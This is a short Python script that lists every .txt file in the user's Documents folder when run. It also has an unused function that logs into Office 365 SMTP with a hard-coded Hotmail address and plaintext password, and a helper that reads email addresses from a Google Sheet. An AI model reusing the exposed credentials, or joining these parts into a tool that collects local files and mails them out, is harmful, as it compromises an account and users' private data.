import os
def get_all_disks():
    """
    Get all disks on machine
    
    Returns
    ________
    List of drivers
    """

    desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Documents')
    l = []
    l.append(desktop)

    # partitions = psutil.disk_partitions()
    #
    # for partition in partitions:
    #     l.append(partition.device)
    return l


def get_all_txt_files():
    """
    Get ALl txt Files from PC

    Returns
    _______
    List of Paths to txt fi les
    """

    root_dir = os.path.join(os.path.join(os.path.expanduser('~')), 'Documents')


    # Specify the file extension to search for
    extension = '.txt'

    # Initialize an empty list to store the file paths
    file_paths = []

    # Walk through all directories in the root directory
    for root, _, files in os.walk(root_dir):
        # Check each file in the current directory for the specified extension
        for file in files:
            if file.endswith(extension):
                print(os.path.join(root, file))
                file_paths.append(os.path.join(root, file))

    return file_paths

get_all_txt_files()

def send_emails():
    import smtplib
    from email.message import EmailMessage

    # set your email and password
    # please use App Password
    email_address = "ns-team-20@hotmail.com"
    email_password = "vm6f2Xkk82U8g8X"

    # create email
    msg = EmailMessage()
    msg['Subject'] = "Email subject 2"
    msg['From'] = email_address
    msg['To'] = ["omarosama818@gmail.com"]
    msg.set_content("Test")

    print('here')
    # send email
    smtp = smtplib.SMTP('smtp.office365.com', 587 )
    smtp.starttls()
    print('conn')
    smtp.login(email_address, email_password)
    print('log')
    smtp.send_message(msg)

# send_emails()


def get_recipient_list():
    import pandas as pd

    df = pd.read_csv('https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv')

    return df.Email.to_list()

